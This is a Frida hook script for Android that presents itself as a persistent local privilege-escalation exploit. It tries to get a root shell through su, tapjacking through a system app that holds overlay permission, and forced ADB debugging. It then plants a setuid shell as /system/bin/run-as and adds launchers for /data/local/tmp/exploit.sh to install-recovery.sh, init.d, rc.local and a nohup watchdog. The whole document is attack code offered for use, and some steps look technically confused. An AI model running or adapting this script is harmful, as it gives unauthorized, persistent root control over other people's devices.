Java.perform(function() {
    console.log("[+] Hooking Package Installer for Persistent LPE...");

    var Runtime = Java.use("java.lang.Runtime");
    var PackageManager = Java.use("android.app.ActivityThread").currentApplication().getPackageManager();
    var PERMISSION_SYSTEM_ALERT_WINDOW = "android.permission.SYSTEM_ALERT_WINDOW";

    function runCommand(cmd) {
        try {
            var process = Runtime.getRuntime().exec(["su", "-c", cmd]);
            console.log("[+] Executed: " + cmd);
        } catch (e) {
            console.log("[-] Command failed: " + cmd);
        }
    }

    function tryRootShell() {
        console.log("[+] Attempting Root Privilege Escalation...");

        try {
            var process = Runtime.getRuntime().exec(["su", "-c", "id"]);
            var reader = Java.use("java.io.BufferedReader");
            var inputStream = Java.use("java.io.InputStreamReader").$new(process.getInputStream());
            var bufferedReader = reader.$new(inputStream);
            var output = bufferedReader.readLine();

            if (output) {
                console.log("[+] Root Access Confirmed: " + output);
                console.log("[+] Spawning root shell...");
                runCommand("su -c 'sh'");
                return true;
            }
        } catch (e) {
            console.log("[-] Root Shell Exception: " + e.message);
        }
        return false;
    }

    function findSystemAppWithOverlay() {
        console.log("[+] Searching for a system app with SYSTEM_ALERT_WINDOW...");
        var apps = PackageManager.getInstalledApplications(0);
        var foundApp = null;

        for (var i = 0; i < apps.size(); i++) {
            var app = apps.get(i);
            if ((app.flags & 1) !== 0) { // FLAG_SYSTEM
                if (PackageManager.checkPermission(PERMISSION_SYSTEM_ALERT_WINDOW, app.packageName) == 0) {
                    console.log("[+] Found system app with overlay permission: " + app.packageName);
                    foundApp = app.packageName;
                    break;
                }
            }
        }

        if (!foundApp) {
            console.log("[-] No system app with SYSTEM_ALERT_WINDOW found.");
        }

        return foundApp;
    }

    function tryTapjacking(targetApp) {
        if (!targetApp) {
            console.log("[-] No suitable app for Tapjacking. Skipping...");
            return false;
        }

        console.log("[+] Attempting Tapjacking on: " + targetApp);

        var Intent = Java.use("android.content.Intent");
        var overlayIntent = Intent.$new("android.intent.action.MAIN");
        overlayIntent.setClassName(targetApp, "android.accessibilityservice.AccessibilityService");
        overlayIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        try {
            Java.use("android.app.ActivityThread").currentApplication().startActivity(overlayIntent);
            console.log("[+] Tapjacking Attempt Sent!");
            return true;
        } catch (e) {
            console.log("[-] Tapjacking Failed: " + e.message);
            return false;
        }
    }

    function tryIntentHijacking() {
        console.log("[+] Attempting Privileged Intent Hijacking...");
        runCommand("settings put global adb_enabled 1");
        runCommand("svc adb restart");
        console.log("[+] ADB Debugging Enabled! Run `adb root` now.");
    }

    function keepRootAccess() {
        console.log("[+] Attempting to Keep Root Access Across Reboots...");

        // Step 1: Try keeping ADB root mode persistently
        console.log("[+] Trying ADB Root Persistence...");
        runCommand("settings put global adb_enabled 1");
        runCommand("setprop persist.sys.usb.config adb");
        runCommand("svc adb restart");

        console.log("[+] Checking if ADB root succeeded...");
        runCommand("adb root");
        runCommand("adb shell id");

        // Step 2: If ADB root fails, try modifying /system/bin/run-as
        console.log("[+] If ADB root fails, trying /system/bin/run-as modification...");
        runCommand("mount -o rw,remount /system");
        runCommand("cp /system/bin/sh /system/bin/run-as");
        runCommand("chmod 6755 /system/bin/run-as");
        runCommand("chown root:shell /system/bin/run-as");

        console.log("[+] Checking if run-as modification succeeded...");
        runCommand("run-as id");

        // Step 3: If run-as fails, modify install-recovery.sh
        console.log("[+] If run-as fails, modifying install-recovery.sh...");
        runCommand('echo "/system/bin/sh /data/local/tmp/exploit.sh &" >> /system/etc/install-recovery.sh');
        runCommand("chmod 755 /system/etc/install-recovery.sh");

        console.log("[+] Root Persistence Setup Complete!");
    }

    function autoRunExploit() {
        console.log("[+] Setting Up Auto-Execution of Exploit...");

        // Step 1: Try using init.d
        console.log("[+] Trying init.d execution for auto-run...");
        runCommand('echo "#!/system/bin/sh" > /system/etc/init.d/99exploit');
        runCommand('echo "/system/bin/sh /data/local/tmp/exploit.sh &" >> /system/etc/init.d/99exploit');
        runCommand("chmod 755 /system/etc/init.d/99exploit");

        console.log("[+] Checking if init.d execution worked...");
        runCommand("/system/etc/init.d/99exploit");

        // Step 2: If init.d fails, modify rc.local
        console.log("[+] If init.d fails, modifying rc.local...");
        runCommand('echo "/system/bin/sh /data/local/tmp/exploit.sh &" >> /system/etc/rc.local');
        runCommand("chmod 755 /system/etc/rc.local");

        console.log("[+] Checking if rc.local execution worked...");
        runCommand("cat /system/etc/rc.local");

        // Step 3: If rc.local fails, use a watchdog process
        console.log("[+] If rc.local fails, using a watchdog process...");
        runCommand('nohup /system/bin/sh /data/local/tmp/exploit.sh >/dev/null 2>&1 &');

        console.log("[+] Auto-Execution Setup Complete!");
    }

    console.log("[+] Attempting Root Escalation...");
    if (tryRootShell()) {
        console.log("[+] Root Shell Obtained, proceeding with persistence setup.");
        keepRootAccess();
        autoRunExploit();
        return;
    }

    console.log("[-] Root Escalation Failed. Searching for alternative methods...");
    var targetApp = findSystemAppWithOverlay();

    if (targetApp) {
        console.log("[+] Using " + targetApp + " for SYSTEM_ALERT_WINDOW Tapjacking.");
    }

    console.log("[-] Trying Tapjacking...");
    if (!tryTapjacking(targetApp)) {
        console.log("[-] Tapjacking failed. Falling back to Intent Hijacking...");
        tryIntentHijacking();
    }

    console.log("[+] If root is obtained after fallback, setting up persistence...");
    if (tryRootShell()) {
        keepRootAccess();
        autoRunExploit();
    }

    console.log("[+] Exploit Fully Deployed: Root Persistence & Auto-Execution Ready!");
});
